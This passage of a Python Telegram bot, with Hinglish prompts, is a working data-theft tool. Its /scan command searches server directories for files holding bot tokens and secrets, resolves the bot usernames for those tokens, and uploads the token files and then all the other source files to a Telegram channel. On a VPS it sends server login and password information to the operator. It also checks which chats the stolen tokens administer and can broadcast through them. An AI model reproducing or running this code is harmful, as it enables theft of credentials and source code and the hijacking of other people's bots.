        f"Bot ko channel mein <b>Admin</b> banana na bhoolein.",
        parse_mode="HTML",
    )
    return ASK_CHANNEL


async def setup_channel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    channel_input = update.message.text.strip()
    if not (channel_input.startswith("@") or channel_input.lstrip("-").isdigit()):
        await update.message.reply_text(
            "❌ Format sahi nahi.\n<code>@channel_username</code> ya <code>-100xxxxxxxxxx</code> bhejo.",
            parse_mode="HTML",
        )
        return ASK_CHANNEL

    context.user_data["pending_channel"] = channel_input
    try:
        test = await update.get_bot().send_message(chat_id=channel_input, text="✅ Bot connected!")
        await test.delete()
        connected = True
    except TelegramError:
        connected = False

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Save karo", callback_data="setup_save"),
         InlineKeyboardButton("🔄 Dobara likho", callback_data="setup_retry")],
        [InlineKeyboardButton("❌ Cancel", callback_data="setup_cancel")],
    ])
    status = "✅ Connected!" if connected else "⚠️ Test fail — phir bhi save kar sakte hain."
    await update.message.reply_text(
        f"{status}\n\nChannel: <code>{h(channel_input)}</code>\n\nSave karein?",
        parse_mode="HTML", reply_markup=keyboard,
    )
    return ASK_CONFIRM


async def setup_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    if query.data == "setup_save":
        cfg = load_cfg()
        cfg["channel"] = context.user_data.get("pending_channel", "")
        plat = detect_platform()
        if not cfg.get("scan_dirs"):
            cfg["scan_dirs"] = plat["scan_dirs"]
        save_cfg(cfg)
        await query.edit_message_text(
            f"✅ <b>Setup complete!</b>\n\n📢 Channel: <code>{h(cfg['channel'])}</code>\n"
            f"🖥️ Platform: {plat['icon']} {plat['name']}\n\nAb /scan use karein!",
            parse_mode="HTML",
        )
        return ConversationHandler.END
    elif query.data == "setup_retry":
        await query.edit_message_text("Channel username/ID dobara bhejo:")
        return ASK_CHANNEL
    else:
        await query.edit_message_text("❌ Setup cancel.")
        return ConversationHandler.END


async def setup_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("❌ Setup cancel.")
    return ConversationHandler.END


# ─────────────────────────────────────────
#  COMMANDS
# ─────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid  = update.effective_user.id
    name = update.effective_user.first_name

    if is_authenticated(uid, context.application):
        plat   = detect_platform()
        cfg    = load_cfg()
        status = "✅ Ready" if cfg.get("channel") else "⚠️ Channel set nahi (/setup)"
        await update.message.reply_text(
            f"👋 <b>{h(name)}</b>, aagaye!\n\n"
            f"{plat['icon']} Platform: <b>{plat['name']}</b>\n📢 Status: {status}\n\n"
            f"<b>Commands:</b>\n"
            f"/scan       — Source files channel pe bhejo\n"
            f"/stopscan   — Chal rahe scan ko rokein\n"
            f"/checkbot   — Token se bot ke admin chats check karo\n"
            f"/mycode     — Is bot ka code bhejo\n"
            f"/info       — Platform info\n"
            f"/config     — Current config\n"
            f"/adddir     — Extra directory add karo\n"
            f"/setup      — Channel configure karo\n"
            f"/help       — Commands list",
            parse_mode="HTML",
        )
        return ConversationHandler.END

    await update.message.reply_text(
        f"🔐 <b>Password chahiye!</b>\n\n"
        f"Is bot ko use karne ke liye password enter karein:",
        parse_mode="HTML",
    )
    return WAIT_PASSWORD


async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid      = update.effective_user.id
    name     = update.effective_user.first_name
    entered  = update.message.text.strip()
    now      = datetime.now().timestamp()

    # ── Lockout check ────────────────────────────────────────
    lockouts  = context.application.bot_data.setdefault(AUTH_LOCKOUT, {})
    attempts  = context.application.bot_data.setdefault(AUTH_ATTEMPTS, {})
    locked_at = lockouts.get(uid, 0)
    if now < locked_at:
        remaining = int(locked_at - now)
        mins, secs = remaining // 60, remaining % 60
        await update.message.reply_text(
            f"⛔ <b>Bohot zyada galat attempts!</b>\n\n"
            f"<code>{mins}m {secs}s</code> baad dobara try karein.",
            parse_mode="HTML",
        )
        return WAIT_PASSWORD

    if entered == MASTER_PASSWORD:
        # Clear failed attempts on success
        attempts.pop(uid, None)
        lockouts.pop(uid, None)
        authenticate(uid, context.application)
        plat = detect_platform()
        cfg  = load_cfg()
        status = "✅ Ready" if cfg.get("channel") else "⚠️ Channel set nahi (/setup)"
        await update.message.reply_text(
            f"✅ <b>Access mil gaya, {h(name)}!</b>\n\n"
            f"{plat['icon']} Platform: <b>{plat['name']}</b>\n📢 Status: {status}\n\n"
            f"<b>Commands:</b>\n"
            f"/scan       — Source files channel pe bhejo\n"
            f"/stopscan   — Chal rahe scan ko rokein\n"
            f"/checkbot   — Token se bot ke admin chats check karo\n"
            f"/mycode     — Is bot ka code bhejo\n"
            f"/info       — Platform info\n"
            f"/config     — Current config\n"
            f"/adddir     — Extra directory add karo\n"
            f"/setup      — Channel configure karo\n"
            f"/help       — Commands list",
            parse_mode="HTML",
        )
        return ConversationHandler.END
    else:
        # Track failed attempts
        fail_count = attempts.get(uid, 0) + 1
        attempts[uid] = fail_count
        remaining_tries = MAX_AUTH_TRIES - fail_count

        if fail_count >= MAX_AUTH_TRIES:
            lockouts[uid] = now + LOCKOUT_SECONDS
            attempts.pop(uid, None)
            await update.message.reply_text(
                f"🚫 <b>{MAX_AUTH_TRIES} galat attempts!</b>\n\n"
                f"30 minute ke liye block ho gaye.",
                parse_mode="HTML",
            )
            return WAIT_PASSWORD

        await update.message.reply_text(
            f"❌ <b>Galat password!</b>  ({remaining_tries} attempts bache)\n\nDobara try karein:",
            parse_mode="HTML",
        )
        return WAIT_PASSWORD


async def info_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authenticated(update.effective_user.id, context.application):
        await update.message.reply_text("🔒 Pehle /start kar ke password dein.")
        return
    plat = detect_platform()
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except Exception:
        hostname, local_ip = "unknown", "unknown"
    present_keys = get_env_keys_present(plat.get("env_keys", []))
    env_text = ""
    if present_keys:
        env_text = "\n🔑 <b>Env vars:</b> " + ", ".join(f"<code>{h(k)}</code>" for k in present_keys)
    await update.message.reply_text(
        f"{plat['icon']} <b>Platform: {h(plat['name'])}</b>\n\n"
        f"🖥️ OS: <code>{h(platform.system())} {h(platform.release())}</code>\n"
        f"🐍 Python: <code>{h(platform.python_version())}</code>\n"
        f"🌐 Hostname: <code>{h(hostname)}</code>\n"
        f"📡 Local IP: <code>{h(local_ip)}</code>\n"
        f"📂 Working Dir: <code>{h(str(Path.cwd()))}</code>\n"
        f"⏰ Time: <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>{env_text}",
        parse_mode="HTML",
    )


async def config_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authenticated(update.effective_user.id, context.application):
        await update.message.reply_text("🔒 Pehle /start kar ke password dein.")
        return
    cfg  = load_cfg()
    plat = detect_platform()
    dirs_text = "\n".join(f"  {i+1}. <code>{h(d)}</code>" for i, d in enumerate(cfg.get("scan_dirs", plat["scan_dirs"]))) or "  (auto-detect)"
    await update.message.reply_text(
        f"⚙️ <b>Current Config</b>\n\n📢 Channel: <code>{h(cfg.get('channel', 'not set'))}</code>\n"
        f"📁 Scan Dirs:\n{dirs_text}",
        parse_mode="HTML",
    )


async def adddir_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authenticated(update.effective_user.id, context.application):
        await update.message.reply_text("🔒 Pehle /start kar ke password dein.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: <code>/adddir /path/to/bots</code>", parse_mode="HTML")
        return
    new_dir = " ".join(args).strip()
    if not Path(new_dir).exists():
        await update.message.reply_text(f"❌ Directory nahi mili: <code>{h(new_dir)}</code>", parse_mode="HTML")
        return
    cfg = load_cfg()
    if not cfg.get("scan_dirs"):
        cfg["scan_dirs"] = detect_platform()["scan_dirs"]
    if new_dir not in cfg["scan_dirs"]:
        cfg["scan_dirs"].insert(0, new_dir)
        save_cfg(cfg)
        await update.message.reply_text(f"✅ Directory add ho gayi: <code>{h(new_dir)}</code>", parse_mode="HTML")
    else:
        await update.message.reply_text("ℹ️ Yeh directory already list mein hai.")


async def stopscan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authenticated(update.effective_user.id, context.application):
        await update.message.reply_text("🔒 Pehle /start kar ke password dein.")
        return
    if not is_scan_running(context.application):
        await update.message.reply_text("ℹ️ Abhi koi scan chal nahi raha.")
        return
    request_stop(context.application)
    await update.message.reply_text(
        "⛔ <b>Scan band karne ka signal bhej diya!</b>\nJald rukjayega.",
        parse_mode="HTML",
    )


async def scan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_authenticated(uid, context.application):
        await update.message.reply_text("🔒 Pehle /start kar ke password dein.")
        return
    cfg = load_cfg()
    if not cfg.get("channel"):
        await update.message.reply_text("❌ Channel set nahi. Pehle /setup run karein.", parse_mode="HTML")
        return
    if is_scan_running(context.application):
        await update.message.reply_text(
            "⚠️ Scan pehle se chal raha hai!\n/stopscan se rokein.", parse_mode="HTML",
        )
        return

    start_scan_session(context.application, uid)

    msg = await update.message.reply_text("🔍 Platform detect kar raha hoon...")
    plat = detect_platform()
    scan_dirs = cfg.get("scan_dirs") or plat["scan_dirs"]

    await step(msg,
        f"{plat['icon']} <b>Platform: {h(plat['name'])}</b>\n"
        f"📁 <code>{len(scan_dirs)}</code> directories scan hongi...\n"
        f"<i>⛔ Rokna ho toh /stopscan karein</i>"
    )

    # ── VPS: send login info to scan initiator ───────────────
    if plat.get("is_vps"):
        try:
            vps_info = await asyncio.to_thread(collect_vps_info)
            dm_text  = f"{'═'*30}\n🖥️ <b>VPS Login + Password Info</b>\n{'═'*30}\n\n{vps_info}"
            await context.bot.send_message(chat_id=uid, text=dm_text, parse_mode="HTML")
        except Exception as e:
            log.error(f"VPS DM error: {e}")

    # ── Gather files ─────────────────────────────────────────
    all_files = await asyncio.to_thread(gather_all_files, scan_dirs)
    if not all_files:
        await step(msg,
            f"{plat['icon']} Platform: <b>{h(plat['name'])}</b>\n\n"
            f"⚠️ <b>Koi source file nahi mili.</b>\n"
            f"<code>/adddir /path</code> se directory add karein."
        )
        end_scan_session(context.application)
        return

    await step(msg,
        f"{plat['icon']} <b>{h(plat['name'])}</b>\n\n"
        f"📄 <b>{len(all_files)} files found</b>\n🧪 Tokens scan ho rahi hain...\n"
        f"<i>⛔ Rokna ho toh /stopscan karein</i>"
    )

    # ── Token scan ───────────────────────────────────────────
    token_file_data: list[tuple[Path, list[str], list[str]]] = []
    normal_files: list[Path] = []

    for idx, fp in enumerate(all_files):
        if is_stop_requested(context.application):
            await step(msg, f"⛔ <b>Scan rok diya gaya!</b>\n📄 {idx}/{len(all_files)} files scan hue")
            end_scan_session(context.application)
            return
        display_findings, raw_tokens = await asyncio.to_thread(scan_file_for_tokens, fp)
        if display_findings:
            token_file_data.append((fp, display_findings, raw_tokens))
        else:
            normal_files.append(fp)
        if idx % 20 == 0 and idx > 0:
            await step(msg,
                f"{plat['icon']} <b>{h(plat['name'])}</b>\n\n"
                f"🧪 Token scan: <b>{idx}/{len(all_files)}</b>\n"
                f"🔑 Token files: <b>{len(token_file_data)}</b>\n"
                f"<i>⛔ /stopscan se rokein</i>"
            )

    normal_files = await asyncio.to_thread(sort_files_big_to_small, normal_files)

    # ── Pre-resolve usernames → username-bots FIRST ──────────
    await step(msg,
        f"{plat['icon']} <b>{h(plat['name'])}</b>\n\n"
        f"🤖 Bot usernames resolve kar raha hoon...\n"
        f"🔑 Token files: {len(token_file_data)}\n"
        f"<i>⛔ /stopscan se rokein</i>"
    )
    # For each token file, try to resolve username for first token
    enriched: list[tuple[Path, list[str], list[str], str]] = []  # (path, display, raw, username)
    for fp, display_findings, raw_tokens in token_file_data:
        uname = ""
        if raw_tokens:
            uname = await resolve_bot_username(raw_tokens[0])
        enriched.append((fp, display_findings, raw_tokens, uname))

    # Sort: files where username was found go FIRST
    def _has_username(item):
        return 0 if ("@" in item[3]) else 1
    enriched.sort(key=_has_username)
    token_file_data = enriched  # type: ignore

    total        = len(all_files)
    token_count  = len(token_file_data)

    await step(msg,
        f"{plat['icon']} <b>{h(plat['name'])}</b>\n\n"
        f"📄 Total: <b>{total}</b> | 🔑 Token files: <b>{token_count}</b>\n"
        f"📁 Normal (size order): <b>{len(normal_files)}</b>\n\n"
        f"📤 Bhejna shuru kar raha hoon...\n"
        f"<b>@username wale bots PEHLE!</b>\n"
        f"<i>⛔ /stopscan se rokein</i>"
    )

    # ── Channel announcement ─────────────────────────────────
    present_keys = get_env_keys_present(plat.get("env_keys", []))
    env_block = "\n🔑 <b>Env vars:</b> " + ", ".join(f"<code>{h(k)}</code>" for k in present_keys) if present_keys else ""

    ok = await send_text(context, cfg["channel"],
        f"{'═'*32}\n{plat['icon']} <b>Source Code Dump</b>\n{'═'*32}\n"
        f"🖥️ Platform: <b>{h(plat['name'])}</b>\n"
        f"📄 Files: <code>{total}</code> | 🔑 Token files: <code>{token_count}</code>\n"
        f"📋 Token files pehle → phir badi se choti\n"
        f"⏰ <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>{env_block}",
    )
    if not ok:
        await step(msg,
            f"❌ Channel pe message nahi gaya!\n<code>{h(cfg['channel'])}</code>\n\n"
            f"Bot ko channel mein Admin banao."
        )
        end_scan_session(context.application)
        return

    # ── Token files pehle ────────────────────────────────────
    sent = failed = 0
    errors: list[str] = []

    if token_file_data:
        await send_text(context, cfg["channel"],
            f"{'─'*28}\n🔑 <b>TOKEN / SECRET FILES — PEHLE</b>\n{'─'*28}\n"
            f"<b>{token_count}</b> files mein tokens mile hain."
        )

    for i, (filepath, display_findings, raw_tokens, pre_uname) in enumerate(token_file_data, 1):
        if is_stop_requested(context.application):
            await step(msg, f"⛔ <b>Rok diya!</b>\n✅ {sent}  ❌ {failed}")
            await send_text(context, cfg["channel"], f"⛔ <b>Scan roka gaya</b>\n✅ {sent} | ❌ {failed}")
            end_scan_session(context.application)
            return

        # Use pre-resolved username for first token, resolve rest
        username_lines = []
        for idx_t, raw_token in enumerate(raw_tokens[:3]):
            uname = pre_uname if idx_t == 0 else await resolve_bot_username(raw_token)
            username_lines.append(f"🤖 Bot: {uname}")

        findings_text = "\n".join(display_findings[:5])
        if len(display_findings) > 5:
            findings_text += f"\n  ... +{len(display_findings)-5} aur"
        usernames_text = "\n".join(username_lines)

        try:
            size_str = f"{filepath.stat().st_size / 1024:.1f} KB"
        except OSError:
            size_str = "?"

        caption = (
            f"🔑 [{i}/{token_count}] <code>{h(filepath.name)}</code>\n"
            f"📏 {size_str} | 📍 <code>{h(str(filepath))}</code>\n"
            f"{findings_text}"
            + (f"\n{usernames_text}" if usernames_text else "")
        )

        pct = int(i / total * 100)
        bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
        await step(msg,
            f"🔑 Token files bhej raha hoon...\n"
            f"<code>[{bar}] {pct}%</code> ({i}/{total})\n"
            f"✅ {sent}  ❌ {failed}\n<i>⛔ /stopscan se rokein</i>"
        )
        if await send_doc(context, filepath, caption, cfg["channel"]):
            sent += 1
        else:
            failed += 1; errors.append(filepath.name)
        await asyncio.sleep(SEND_DELAY)

    # ── Normal files (big → small) ───────────────────────────
    if normal_files:
        await send_text(context, cfg["channel"],
            f"{'─'*28}\n📁 <b>BAAKI FILES — Badi se Choti</b>\n{'─'*28}\n"
            f"<b>{len(normal_files)}</b> files."
        )

    current_dir = None
    for i, filepath in enumerate(normal_files, 1):
        if is_stop_requested(context.application):
            await step(msg, f"⛔ <b>Rok diya!</b>\n✅ {sent}  ❌ {failed}\n📁 {i-1}/{len(normal_files)}")
            await send_text(context, cfg["channel"], f"⛔ <b>Roka gaya</b>\n✅ {sent} | {i-1}/{len(normal_files)} normal files bheje")
            end_scan_session(context.application)
            return

        for d in scan_dirs:
            if str(filepath).startswith(d) and d != current_dir:
                current_dir = d
                await send_text(context, cfg["channel"], f"📂 <b>Dir:</b> <code>{h(d)}</code>")

        try:
            size_str = f"{filepath.stat().st_size / 1024:.1f} KB"
        except OSError:
            size_str = "?"

        global_idx = token_count + i
        caption = f"[{global_idx}/{total}] <code>{h(filepath.name)}</code>  📏 {size_str}"

        if i % 5 == 0 or i == len(normal_files):
            pct = int(global_idx / total * 100)
            bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
            await step(msg,
                f"{plat['icon']} <b>{h(plat['name'])}</b>\n"
                f"<code>[{bar}] {pct}%</code>\n"
                f"📤 {global_idx}/{total} | ✅ {sent}  ❌ {failed}\n"
                f"<i>⛔ /stopscan se rokein</i>"
            )

        if await send_doc(context, filepath, caption, cfg["channel"]):
            sent += 1
        else:
            failed += 1; errors.append(filepath.name)
        await asyncio.sleep(SEND_DELAY)

    # ── Final summary ────────────────────────────────────────
    error_block = ""
    if errors:
        err_list = "\n".join(f"  • <code>{h(e)}</code>" for e in errors[:10])
        if len(errors) > 10:
            err_list += f"\n  ... +{len(errors)-10} aur"
        error_block = f"\n\n❌ <b>Failed files:</b>\n{err_list}"

    summary = (
        f"{'═'*32}\n✅ <b>Scan Complete!</b>\n{'═'*32}\n"
        f"{plat['icon']} <b>{h(plat['name'])}</b>\n"
        f"📄 Total: <code>{total}</code> | 🔑 Token files: <code>{token_count}</code>\n"
        f"✅ Sent: <code>{sent}</code>  ❌ Failed: <code>{failed}</code>{error_block}"
    )
    await send_text(context, cfg["channel"], summary)
    await step(msg, summary)
    end_scan_session(context.application)


async def mycode_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authenticated(update.effective_user.id, context.application):
        await update.message.reply_text("🔒 Pehle /start kar ke password dein.")
        return
    cfg = load_cfg()
    if not cfg.get("channel"):
        await update.message.reply_text("❌ /setup se channel set karein.")
        return
    own = Path(__file__)
    msg = await update.message.reply_text("📤 Code bhej raha hoon...")
    await send_text(context, cfg["channel"],
        f"🤖 <b>Bot.py</b>\n📍 <code>{h(own)}</code>\n📏 <code>{own.stat().st_size/1024:.1f} KB</code>",
    )
    ok = await send_doc(context, own, f"🤖 <code>{h(own.name)}</code>", cfg["channel"])
    if ok:
        await msg.edit_text(f"✅ Bhej diya! (<code>{h(cfg['channel'])}</code>)", parse_mode="HTML")
    else:
        await msg.edit_text("❌ Error. Channel config check karein.")


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🛠 <b>Commands</b>\n\n"
        "/start      — Login (password)\n"
        "/setup      — Channel configure karo\n"
        "/scan       — Source files channel pe bhejo\n"
        "/stopscan   — Scan rokein ⛔\n"
        "/checkbot   — Token se admin chats check karo\n"
        "/mycode     — Bot ka apna code bhejo\n"
        "/info       — Platform & server info\n"
        "/config     — Current settings\n"
        "/adddir     — Extra directory add karo\n"
        "/help       — Yeh message",
        parse_mode="HTML",
    )


# ─────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────

def main():
    if BOT_TOKEN in ("", "APNA_BOT_TOKEN_YAHAN_DAALO"):
        raise SystemExit("\n❌  BOT_TOKEN set nahi hai!\n   bot.py mein Line 38 pe token daalo.\n")

    log.info("Bot start ho raha hai...")
    app = Application.builder().token(BOT_TOKEN).build()

    # Password conversation — /start triggers it
    auth_conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            WAIT_PASSWORD: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_password),
            ],
        },
        fallbacks=[CommandHandler("start", start)],
        per_user=True,
        per_chat=True,
    )

    # Setup conversation
    setup_conv = ConversationHandler(
        entry_points=[CommandHandler("setup", setup_start)],
        states={
            ASK_CHANNEL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, setup_channel),
                CallbackQueryHandler(setup_callback, pattern="^setup_"),
            ],
            ASK_CONFIRM: [CallbackQueryHandler(setup_callback, pattern="^setup_")],
        },
        fallbacks=[CommandHandler("cancel", setup_cancel)],
    )

    # Broadcast conversation — entry via 📣 button after /checkbot
    broadcast_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(broadcast_start, pattern="^bc_start$")],
        states={
            BC_MSG:   [MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_msg)],
            BC_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_count)],
        },
        fallbacks=[CommandHandler("cancel", broadcast_cancel)],
        per_user=True,
        per_chat=True,
    )

    app.add_handler(auth_conv)
    app.add_handler(setup_conv)
    app.add_handler(broadcast_conv)
    app.add_handler(CommandHandler("help",      help_cmd))
    app.add_handler(CommandHandler("info",      info_cmd))
    app.add_handler(CommandHandler("config",    config_cmd))
    app.add_handler(CommandHandler("adddir",    adddir_cmd))
    app.add_handler(CommandHandler("scan",      scan_cmd))
    app.add_handler(CommandHandler("stopscan",  stopscan_cmd))
    app.add_handler(CommandHandler("mycode",    mycode_cmd))
    app.add_handler(CommandHandler("checkbot",  checkbot_cmd))

    log.info("Bot ready. Ctrl+C se band karein.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()